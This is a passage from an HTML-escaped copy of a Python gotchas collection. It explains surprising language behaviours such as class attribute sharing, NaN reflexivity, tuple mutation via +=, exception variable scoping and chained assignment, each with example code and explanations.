class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; int(True)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; int(False)&#xA;0&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;See this StackOverflow &lt;a href=&#34;https://stackoverflow.com/a/8169049/4354153&#34;&gt;answer&lt;/a&gt; for the rationale behind it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Initially, Python used to have no &lt;code&gt;bool&lt;/code&gt; type (people used 0 for false and non-zero value like 1 for true). &lt;code&gt;True&lt;/code&gt;, &lt;code&gt;False&lt;/code&gt;, and a &lt;code&gt;bool&lt;/code&gt; type was added in 2.x versions, but, for backward compatibility, &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt; couldn&#39;t be made constants. They just were built-in variables, and it was possible to reassign them&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python 3 was backward-incompatible, the issue was finally fixed, and thus the last snippet won&#39;t work with Python 3.x!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Class attributes and instance attributes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6f332208-33bd-482d-8106-42863b739ed9 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class A:&#xA;    x = 1&#xA;&#xA;class B(A):&#xA;    pass&#xA;&#xA;class C(A):&#xA;    pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x&#xA;(1, 1, 1)&#xA;&amp;gt;&amp;gt;&amp;gt; B.x = 2&#xA;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x&#xA;(1, 2, 1)&#xA;&amp;gt;&amp;gt;&amp;gt; A.x = 3&#xA;&amp;gt;&amp;gt;&amp;gt; A.x, B.x, C.x # C.x changed, but B.x didn&#39;t&#xA;(3, 2, 3)&#xA;&amp;gt;&amp;gt;&amp;gt; a = A()&#xA;&amp;gt;&amp;gt;&amp;gt; a.x, A.x&#xA;(3, 3)&#xA;&amp;gt;&amp;gt;&amp;gt; a.x += 1&#xA;&amp;gt;&amp;gt;&amp;gt; a.x, A.x&#xA;(4, 3)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    some_var = 15&#xA;    some_list = [5]&#xA;    another_list = [5]&#xA;    def __init__(self, x):&#xA;        self.some_var = x + 1&#xA;        self.some_list = self.some_list + [x]&#xA;        self.another_list += [x]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_obj = SomeClass(420)&#xA;&amp;gt;&amp;gt;&amp;gt; some_obj.some_list&#xA;[5, 420]&#xA;&amp;gt;&amp;gt;&amp;gt; some_obj.another_list&#xA;[5, 420]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj = SomeClass(111)&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.some_list&#xA;[5, 111]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list&#xA;[5, 420, 111]&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list is SomeClass.another_list&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; another_obj.another_list is some_obj.another_list&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Class variables and variables in class instances are internally handled as dictionaries of a class object. If a variable name is not found in the dictionary of the current class, the parent classes are searched for it.&lt;/li&gt; &#xA; &lt;li&gt;The &lt;code&gt;+=&lt;/code&gt; operator modifies the mutable object in-place without creating a new object. So changing the attribute of one instance affects the other instances and the class attribute as well.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ yielding None&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5a40c241-2c30-40d0-8ba9-cf7e097b3b53 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_iterable = (&#39;a&#39;, &#39;b&#39;)&#xA;&#xA;def some_func(val):&#xA;    return &#34;something&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt;= 3.7.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; [x for x in some_iterable]&#xA;[&#39;a&#39;, &#39;b&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; [(yield x) for x in some_iterable]&#xA;&amp;lt;generator object &amp;lt;listcomp&amp;gt; at 0x7f70b0a4ad58&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; list([(yield x) for x in some_iterable])&#xA;[&#39;a&#39;, &#39;b&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; list((yield x) for x in some_iterable)&#xA;[&#39;a&#39;, None, &#39;b&#39;, None]&#xA;&amp;gt;&amp;gt;&amp;gt; list(some_func((yield x)) for x in some_iterable)&#xA;[&#39;a&#39;, &#39;something&#39;, &#39;b&#39;, &#39;something&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is a bug in CPython&#39;s handling of &lt;code&gt;yield&lt;/code&gt; in generators and comprehensions.&lt;/li&gt; &#xA; &lt;li&gt;Source and explanation can be found here: &lt;a href=&#34;https://stackoverflow.com/questions/32139885/yield-in-list-comprehensions-and-generator-expressions&#34;&gt;https://stackoverflow.com/questions/32139885/yield-in-list-comprehensions-and-generator-expressions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Related bug report: &lt;a href=&#34;https://bugs.python.org/issue10544&#34;&gt;https://bugs.python.org/issue10544&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Python 3.8+ no longer allows &lt;code&gt;yield&lt;/code&gt; inside list comprehension and will throw a &lt;code&gt;SyntaxError&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Yielding from... return! *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5626d8ef-8802-49c2-adbc-7cda5c550816 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(x):&#xA;    if x == 3:&#xA;        return [&#34;wtf&#34;]&#xA;    else:&#xA;        yield from range(x)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;gt; 3.3):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(some_func(3))&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where did the &lt;code&gt;&#34;wtf&#34;&lt;/code&gt; go? Is it due to some special effect of &lt;code&gt;yield from&lt;/code&gt;? Let&#39;s validate that,&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(x):&#xA;    if x == 3:&#xA;        return [&#34;wtf&#34;]&#xA;    else:&#xA;        for i in range(x):&#xA;          yield i&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(some_func(3))&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The same result, this didn&#39;t work either.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;From Python 3.3 onwards, it became possible to use &lt;code&gt;return&lt;/code&gt; statement with values inside generators (See &lt;a href=&#34;https://www.python.org/dev/peps/pep-0380/&#34;&gt;PEP380&lt;/a&gt;). The &lt;a href=&#34;https://www.python.org/dev/peps/pep-0380/#enhancements-to-stopiteration&#34;&gt;official docs&lt;/a&gt; say that,&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&#34;... &lt;code&gt;return expr&lt;/code&gt; in a generator causes &lt;code&gt;StopIteration(expr)&lt;/code&gt; to be raised upon exit from the generator.&#34;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In the case of &lt;code&gt;some_func(3)&lt;/code&gt;, &lt;code&gt;StopIteration&lt;/code&gt; is raised at the beginning because of &lt;code&gt;return&lt;/code&gt; statement. The &lt;code&gt;StopIteration&lt;/code&gt; exception is automatically caught inside the &lt;code&gt;list(...)&lt;/code&gt; wrapper and the &lt;code&gt;for&lt;/code&gt; loop. Therefore, the above two snippets result in an empty list.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To get &lt;code&gt;[&#34;wtf&#34;]&lt;/code&gt; from the generator &lt;code&gt;some_func&lt;/code&gt; we need to catch the &lt;code&gt;StopIteration&lt;/code&gt; exception,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;try:&#xA;    next(some_func(3))&#xA;except StopIteration as e:&#xA;    some_string = e.value&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_string&#xA;[&#34;wtf&#34;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Nan-reflexivity *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 59bee91a-36e0-47a4-8c7d-aa89bf1d3976 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = float(&#39;inf&#39;)&#xA;b = float(&#39;nan&#39;)&#xA;c = float(&#39;-iNf&#39;)  # These strings are case-insensitive&#xA;d = float(&#39;nan&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;inf&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;nan&#xA;&amp;gt;&amp;gt;&amp;gt; c&#xA;-inf&#xA;&amp;gt;&amp;gt;&amp;gt; float(&#39;some_other_string&#39;)&#xA;ValueError: could not convert string to float: some_other_string&#xA;&amp;gt;&amp;gt;&amp;gt; a == -c # inf==inf&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; None == None # None == None&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; b == d # but nan!=nan&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; 50 / a&#xA;0.0&#xA;&amp;gt;&amp;gt;&amp;gt; a / a&#xA;nan&#xA;&amp;gt;&amp;gt;&amp;gt; 23 + b&#xA;nan&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; y = x / x&#xA;&amp;gt;&amp;gt;&amp;gt; y is y # identity holds&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; y == y # equality fails of y&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; [y] == [y] # but the equality succeeds for the list containing y&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;&#39;inf&#39;&lt;/code&gt; and &lt;code&gt;&#39;nan&#39;&lt;/code&gt; are special strings (case-insensitive), which, when explicitly typecast-ed to &lt;code&gt;float&lt;/code&gt; type, are used to represent mathematical &#34;infinity&#34; and &#34;not a number&#34; respectively.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since according to IEEE standards &lt;code&gt; NaN != NaN&lt;/code&gt;, obeying this rule breaks the reflexivity assumption of a collection element in Python i.e. if &lt;code&gt;x&lt;/code&gt; is a part of a collection like &lt;code&gt;list&lt;/code&gt;, the implementations like comparison are based on the assumption that &lt;code&gt;x == x&lt;/code&gt;. Because of this assumption, the identity is compared first (since it&#39;s faster) while comparing two elements, and the values are compared only when the identities mismatch. The following snippet will make things clearer,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; x == x, [x] == [x]&#xA;(False, True)&#xA;&amp;gt;&amp;gt;&amp;gt; y = float(&#39;nan&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; y == y, [y] == [y]&#xA;(False, True)&#xA;&amp;gt;&amp;gt;&amp;gt; x == y, [x] == [y]&#xA;(False, False)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Since the identities of &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; are different, the values are considered, which are also different; hence the comparison returns &lt;code&gt;False&lt;/code&gt; this time.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Interesting read: &lt;a href=&#34;https://bertrandmeyer.com/2010/02/06/reflexivity-and-other-pillars-of-civilization/&#34;&gt;Reflexivity, and other pillars of civilization&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Mutating the immutable!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 15a9e782-1695-43ea-817a-a9208f6bb33d ---&gt; &#xA;&lt;p&gt;This might seem trivial if you know how references work in Python.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_tuple = (&#34;A&#34;, &#34;tuple&#34;, &#34;with&#34;, &#34;values&#34;)&#xA;another_tuple = ([1, 2], [3, 4], [5, 6])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_tuple[2] = &#34;change this&#34;&#xA;TypeError: &#39;tuple&#39; object does not support item assignment&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple[2].append(1000) #This throws no error&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple&#xA;([1, 2], [3, 4], [5, 6, 1000])&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple[2] += [99, 999]&#xA;TypeError: &#39;tuple&#39; object does not support item assignment&#xA;&amp;gt;&amp;gt;&amp;gt; another_tuple&#xA;([1, 2], [3, 4], [5, 6, 1000, 99, 999])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But I thought tuples were immutable...&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Quoting from &lt;a href=&#34;https://docs.python.org/3/reference/datamodel.html&#34;&gt;https://docs.python.org/3/reference/datamodel.html&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Immutable sequences An object of an immutable sequence type cannot change once it is created. (If the object contains references to other objects, these other objects may be mutable and may be modified; however, the collection of objects directly referenced by an immutable object cannot change.)&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;+=&lt;/code&gt; operator changes the list in-place. The item assignment doesn&#39;t work, but when the exception occurs, the item has already been changed in place.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There&#39;s also an explanation in &lt;a href=&#34;https://docs.python.org/3/faq/programming.html#why-does-a-tuple-i-item-raise-an-exception-when-the-addition-works&#34;&gt;official Python FAQ&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The disappearing variable from outer scope&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7f1e71b6-cb3e-44fb-aa47-87ef1b7decc8 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;e = 7&#xA;try:&#xA;    raise Exception()&#xA;except Exception as e:&#xA;    pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(e)&#xA;# prints nothing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(e)&#xA;NameError: name &#39;e&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Source: &lt;a href=&#34;https://docs.python.org/3/reference/compound_stmts.html#except&#34;&gt;https://docs.python.org/3/reference/compound_stmts.html#except&lt;/a&gt;&lt;/p&gt; &lt;p&gt;When an exception has been assigned using &lt;code&gt;as&lt;/code&gt; target, it is cleared at the end of the &lt;code&gt;except&lt;/code&gt; clause. This is as if&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;except E as N:&#xA;    foo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;was translated into&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;except E as N:&#xA;    try:&#xA;        foo&#xA;    finally:&#xA;        del N&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This means the exception must be assigned to a different name to be able to refer to it after the except clause. Exceptions are cleared because, with the traceback attached to them, they form a reference cycle with the stack frame, keeping all locals in that frame alive until the next garbage collection occurs.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The clauses are not scoped in Python. Everything in the example is present in the same scope, and the variable &lt;code&gt;e&lt;/code&gt; got removed due to the execution of the &lt;code&gt;except&lt;/code&gt; clause. The same is not the case with functions that have their separate inner-scopes. The example below illustrates this:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def f(x):&#xA;    del(x)&#xA;    print(x)&#xA;&#xA;x = 5&#xA;y = [5, 4, 3]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; f(x)&#xA;UnboundLocalError: local variable &#39;x&#39; referenced before assignment&#xA;&amp;gt;&amp;gt;&amp;gt; f(y)&#xA;UnboundLocalError: local variable &#39;x&#39; referenced before assignment&#xA;&amp;gt;&amp;gt;&amp;gt; x&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; y&#xA;[5, 4, 3]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In Python 2.x, the variable name &lt;code&gt;e&lt;/code&gt; gets assigned to &lt;code&gt;Exception()&lt;/code&gt; instance, so when you try to print, it prints nothing.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; e&#xA;Exception()&#xA;&amp;gt;&amp;gt;&amp;gt; print e&#xA;# Nothing is printed!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The mysterious key type conversion&lt;/h3&gt; &#xA;&lt;!-- Example ID: 00f42dd0-b9ef-408d-9e39-1bc209ce3f36 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass(str):&#xA;    pass&#xA;&#xA;some_dict = {&#39;s&#39;: 42}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; type(list(some_dict.keys())[0])&#xA;str&#xA;&amp;gt;&amp;gt;&amp;gt; s = SomeClass(&#39;s&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[s] = 40&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict # expected: Two different keys-value pairs&#xA;{&#39;s&#39;: 40}&#xA;&amp;gt;&amp;gt;&amp;gt; type(list(some_dict.keys())[0])&#xA;str&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Both the object &lt;code&gt;s&lt;/code&gt; and the string &lt;code&gt;&#34;s&#34;&lt;/code&gt; hash to the same value because &lt;code&gt;SomeClass&lt;/code&gt; inherits the &lt;code&gt;__hash__&lt;/code&gt; method of &lt;code&gt;str&lt;/code&gt; class.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;SomeClass(&#34;s&#34;) == &#34;s&#34;&lt;/code&gt; evaluates to &lt;code&gt;True&lt;/code&gt; because &lt;code&gt;SomeClass&lt;/code&gt; also inherits &lt;code&gt;__eq__&lt;/code&gt; method from &lt;code&gt;str&lt;/code&gt; class.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since both the objects hash to the same value and are equal, they are represented by the same key in the dictionary.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For the desired behavior, we can redefine the &lt;code&gt;__eq__&lt;/code&gt; method in &lt;code&gt;SomeClass&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass(str):&#xA;  def __eq__(self, other):&#xA;      return (&#xA;          type(self) is SomeClass&#xA;          and type(other) is SomeClass&#xA;          and super().__eq__(other)&#xA;      )&#xA;&#xA;  # When we define a custom __eq__, Python stops automatically inheriting the&#xA;  # __hash__ method, so we need to define it as well&#xA;  __hash__ = str.__hash__&#xA;&#xA;some_dict = {&#39;s&#39;:42}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; s = SomeClass(&#39;s&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[s] = 40&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{&#39;s&#39;: 40, &#39;s&#39;: 42}&#xA;&amp;gt;&amp;gt;&amp;gt; keys = list(some_dict.keys())&#xA;&amp;gt;&amp;gt;&amp;gt; type(keys[0]), type(keys[1])&#xA;(__main__.SomeClass, str)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s see if you can guess this?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 81aa9fbe-bd63-4283-b56d-6fdd14c9105e ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a, b = a[b] = {}, 5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;{5: ({...}, 5)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;According to &lt;a href=&#34;https://docs.python.org/3/reference/simple_stmts.html#assignment-statements&#34;&gt;Python language reference&lt;/a&gt;, assignment statements have the form &lt;pre&gt;&lt;code&gt;(target_list &#34;=&#34;)+ (expression_list | yield_expression)&#xA;&lt;/code&gt;&lt;/pre&gt; and&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;An assignment statement evaluates the expression list (remember that this can be a single expression or a comma-separated list, the latter yielding a tuple) and assigns the single resulting object to each of the target lists, from left to right.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;+&lt;/code&gt; in &lt;code&gt;(target_list &#34;=&#34;)+&lt;/code&gt; means there can be &lt;strong&gt;one or more&lt;/strong&gt; target lists. In this case, target lists are &lt;code&gt;a, b&lt;/code&gt; and &lt;code&gt;a[b]&lt;/code&gt; (note the expression list is exactly one, which in our case is &lt;code&gt;{}, 5&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;After the expression list is evaluated, its value is unpacked to the target lists from &lt;strong&gt;left to right&lt;/strong&gt;. So, in our case, first the &lt;code&gt;{}, 5&lt;/code&gt; tuple is unpacked to &lt;code&gt;a, b&lt;/code&gt; and we now have &lt;code&gt;a = {}&lt;/code&gt; and &lt;code&gt;b = 5&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;a&lt;/code&gt; is now assigned to &lt;code&gt;{}&lt;/code&gt;, which is a mutable object.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The second target list is &lt;code&gt;a[b]&lt;/code&gt; (you may expect this to throw an error because both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; have not been defined in the statements before. But remember, we just assigned &lt;code&gt;a&lt;/code&gt; to &lt;code&gt;{}&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; to &lt;code&gt;5&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Now, we are setting the key &lt;code&gt;5&lt;/code&gt; in the dictionary to the tuple &lt;code&gt;({}, 5)&lt;/code&gt; creating a circular reference (the &lt;code&gt;{...}&lt;/code&gt; in the output refers to the same object that &lt;code&gt;a&lt;/code&gt; is already referencing). Another simpler example of circular reference could be&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = some_list[0] = [0]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list&#xA;[[...]]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[0]&#xA;[[...]]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list is some_list[0]&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[0][0][0][0][0][0] == some_list&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Similar is the case in our example (&lt;code&gt;a[b][0]&lt;/code&gt; is the same object as &lt;code&gt;a&lt;/code&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So to sum it up, you can break the example down to&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a, b = {}, 5&#xA;a[b] = a, b&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;And the circular reference can be justified by the fact that &lt;code&gt;a[b][0]&lt;/code&gt; is the same object as &lt;code&gt;a&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a[b][0] is a&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: Slippery Slopes&lt;/h2&gt; &#xA;&lt;h3&gt;▶ Modifying a dictionary while iterating over it&lt;/h3&gt; &#xA;&lt;!-- Example ID: b4e5cdfb-c3a8-4112-bd38-e2356d801c41 ---&gt; &#xA;&lt;pre&gt;&lt;code 